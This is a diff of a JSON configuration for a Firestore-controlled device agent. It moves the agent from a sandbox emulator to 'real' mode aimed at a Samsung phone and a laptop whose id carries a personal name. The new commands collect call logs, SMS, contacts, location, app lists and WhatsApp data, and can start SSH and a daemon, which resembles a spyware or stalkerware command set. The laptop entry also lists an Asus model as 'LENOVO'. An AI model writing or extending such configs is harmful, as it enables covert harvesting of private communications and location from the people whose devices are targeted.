@@ -1,24 +1,42 @@
 {
   "project": "intrepid-stage-495117-q1",
-  "mode": "emulator",
-  "emulator_host": "127.0.0.1:8080",
-  "database": "(default)",
-  "collection": "sandbox_devices",
-  "service_account_key": "C:\\Users\\abcom\\Go4Garage\\Eka Runner\\serviceAccountKey.json",
+  "mode": "real",
+  "database": "eka-agent",
+  "collection": "devices",
   "firestore_scope": "https://www.googleapis.com/auth/datastore",
-  "heartbeat_interval_seconds": 10,
-  "command_poll_interval_seconds": 5,
+  "heartbeat_interval_seconds": 15,
+  "command_poll_interval_seconds": 15,
   "devices": [
     {
-      "id": "test-scaffold-1",
-      "display_name": "Sandbox Device Alpha",
-      "role": "primary"
+      "id": "samsung-s24-ultra",
+      "display_name": "Samsung S24 Ultra",
+      "role": "phone",
+      "type": "android",
+      "model": "SM-S928B"
     },
     {
-      "id": "test-scaffold-2",
-      "display_name": "Sandbox Device Beta",
-      "role": "secondary"
+      "id": "jayti-asus-vivobook",
+      "display_name": "Asus VivoBook",
+      "role": "laptop",
+      "type": "windows",
+      "model": "LENOVO"
     }
   ],
-  "allowed_commands": ["status-only", "ping", "echo"]
+  "allowed_commands": [
+    "sync-now",
+    "heartbeat",
+    "status-only",
+    "wakeup",
+    "collect-calls",
+    "collect-sms",
+    "collect-contacts",
+    "collect-location",
+    "collect-app-list",
+    "collect-whatsapp",
+    "full-sync",
+    "extract_whatsapp",
+    "debug-calllogs",
+    "start-ssh",
+    "start-daemon"
+  ]
 }
